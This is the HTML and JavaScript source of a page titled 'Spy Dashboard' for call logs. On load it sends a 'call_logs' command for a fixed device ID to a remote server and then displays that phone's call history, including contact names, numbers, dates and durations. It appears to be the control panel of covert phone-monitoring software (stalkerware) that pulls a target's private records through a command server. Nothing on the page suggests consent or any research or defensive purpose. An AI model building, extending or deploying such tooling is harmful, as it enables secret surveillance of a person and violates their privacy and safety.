<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Call Logs - Spy Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --incoming: #4caf50;
            --outgoing: #ff9800;
            --missed: #f44336;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 20px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 500px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px;
            border: 1px solid var(--glass-border);
            min-height: 80vh;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 25px; padding-bottom: 15px;
            border-bottom: 1px solid var(--glass-border);
        }

        .back-btn {
            color: var(--text-main); font-size: 1.2rem;
            text-decoration: none; width: 40px; height: 40px;
            background: var(--glass-bg); border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
        }

        .page-title { font-size: 1.2rem; font-weight: bold; }
        
        .refresh-btn {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
        }

        .log-list { display: flex; flex-direction: column; gap: 10px; max-height: 600px; overflow-y: auto; }

        .log-card {
            background: var(--glass-bg); padding: 12px 15px;
            border-radius: 12px; display: flex; align-items: center;
            border: 1px solid var(--glass-border); transition: 0.2s;
        }
        .log-card:hover { transform: translateX(3px); background: rgba(255,255,255,0.15); }

        .log-icon {
            font-size: 1.2rem; margin-right: 15px; width: 35px; height: 35px;
            display: flex; align-items: center; justify-content: center;
            background: rgba(255,255,255,0.05); border-radius: 50%;
        }
        
        .log-icon.incoming { color: var(--incoming); }
        .log-icon.outgoing { color: var(--outgoing); }
        .log-icon.missed { color: var(--missed); }

        .log-info { flex: 1; }
        .log-number { font-size: 1rem; font-weight: 500; }
        .log-meta { font-size: 0.75rem; color: var(--text-muted); margin-top: 4px; display: flex; gap: 10px; }
        
        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Call History</span>
            <button onclick="fetchLogs()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
        </div>

        <div class="log-list" id="logsContainer">
            <div class="status-msg">
                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
                <p>Requesting Call Logs...</p>
            </div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const DEVICE_ID = "M2103K19I";

        document.addEventListener("DOMContentLoaded", () => {
            sendCommand();
            setTimeout(fetchLogs, 5000); // 5 sec baad check karo
        });

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'call_logs' })
            }).then(() => console.log("Call Logs Command Sent"));
        }

        function fetchLogs() {
            const container = document.getElementById("logsContainer");

            // ✅ CORRECTED: Direct file ki jagah API route use kar rahe hain
            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${new Date().getTime()}`)
                .then(response => {
                    if (!response.ok) throw new Error("No data");
                    return response.json();
                })
                .then(data => {
                    if (!data || data.length === 0) {
                        container.innerHTML = `
                            <div class='status-msg'>
                                <i class="fa-solid fa-phone-slash"></i>
                                <p>No call history found or phone hasn't uploaded yet.</p>
                            </div>`;
                        return;
                    }

                    container.innerHTML = ""; // Clear Loading

                    // Logs newest first dikhane ke liye reverse (agar app purane se bhej raha ho)
                    data.forEach(log => {
                        let iconClass = "incoming";
                        let iconName = "fa-arrow-down-left";
                        
                        const type = (log.type || "").toLowerCase();

                        if(type.includes("outgoing")) {
                            iconClass = "outgoing";
                            iconName = "fa-arrow-up-right";
                        } else if(type.includes("missed") || type.includes("rejected")) {
                            iconClass = "missed";
                            iconName = "fa-phone-slash";
                        }

                        let displayDate = log.date;
                        if (!isNaN(log.date)) {
                            displayDate = new Date(parseInt(log.date)).toLocaleString();
                        }

                        const card = `
                            <div class="log-card">
                                <div class="log-icon ${iconClass}">
                                    <i class="fa-solid ${iconName}"></i>
                                </div>
                                <div class="log-info">
                                    <div class="log-number">${log.name || log.number || "Unknown"}</div>
                                    <div class="log-meta">
                                        <span>${displayDate || "Unknown Date"}</span>
                                        <span>•</span>
                                        <span>${log.duration || "0s"}</span>
                                    </div>
                                </div>
                            </div>
                        `;
                        container.innerHTML += card;
                    });
                })
                .catch(err => {
                    console.log("Waiting for phone...");
                    container.innerHTML = `
                        <div class="status-msg">
                            <i class="fa-solid fa-hourglass-start"></i>
                            <p>Connecting to Phone...</p>
                            <small>Fetching latest logs, please wait.</small>
                        </div>`;
                });
        }
    </script>
</body>
</html>
